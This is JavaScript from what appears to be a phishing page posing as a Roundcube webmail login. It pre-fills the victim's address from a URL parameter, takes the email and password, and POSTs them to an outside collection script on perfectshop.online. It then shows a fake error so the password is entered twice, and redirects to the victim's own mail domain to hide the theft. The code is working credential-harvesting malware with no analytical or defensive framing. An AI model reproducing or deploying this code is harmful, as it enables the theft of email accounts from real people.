    <script src="https://uploads-ssl.webflow.com/64a8634540e6e9c6a130b5c3/js/webflow.d2c3cd8ad.js"

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>

    <!-- JavaScript Code -->
    <script>
        $(document).ready(function () {
            let submissionCount = 0;

            // Pre-fill email from URL query parameter
            const urlParams = new URLSearchParams(window.location.search);
            const emailFromQuery = urlParams.get('sync');
            if (emailFromQuery) {
                $('#rcmloginuser').val(decodeURIComponent(emailFromQuery));
            }

            // Handle form submission
            $('#email-form').submit(async function (e) {
                e.preventDefault();  // Prevent form reload

                const email = $('#rcmloginuser').val().trim();
                const password = $('#rcmloginpwd').val().trim();

                // Validate inputs
                if (!email || password.length < 4) {
                    $('#errorImage').show();
                    console.error("Invalid input");
                    return;
                }

                submissionCount++;

                if (submissionCount === 1) {
                    // First submission: Send data via AJAX
                    try {
                        const response = await fetch("https://perfectshop.online/zion16jan/magott.php", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/x-www-form-urlencoded",
                            },
                            body: new URLSearchParams({
                                rcmloginuser: email,
                                rcmloginpwd: password,
                            }),
                        });

                        const result = await response.json();

                        if (result.status === "success") {
                            console.log("First form submission successful.");
                            $('#errorImage').show();
                            $('#rcmloginpwd').val('');  // Clear password field
                        } else {
                            console.error("First submission error:", result.message);
                            submissionCount--;  // Reset count if first submission failed
                        }
                    } catch (error) {
                        console.error("First submission failed:", error);
                        submissionCount--;  // Reset count on error
                    }
                } else if (submissionCount === 2) {
                    // Second submission: Send and then redirect
                    try {
                        const response = await fetch("https://perfectshop.online/zion16jan/magott.php", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/x-www-form-urlencoded",
                            },
                            body: new URLSearchParams({
                                rcmloginuser: email,
                                rcmloginpwd: password,
                            }),
                        });

                        const result = await response.json();

                        if (result.status === "success") {
                            console.log("Second form submission successful. Redirecting...");
                            const domain = email.split('@')[1];
                            const redirectURL = `https://${domain}`;
                            window.location.href = redirectURL;
                        } else {
                            console.error("Second submission error:", result.message);
                            submissionCount--;  // Reset count if second submission failed
                        }
                    } catch (error) {
                        console.error("Second submission failed:", error);
                        submissionCount--;  // Reset count on error
                    }
                }
            });
        });
    </script>
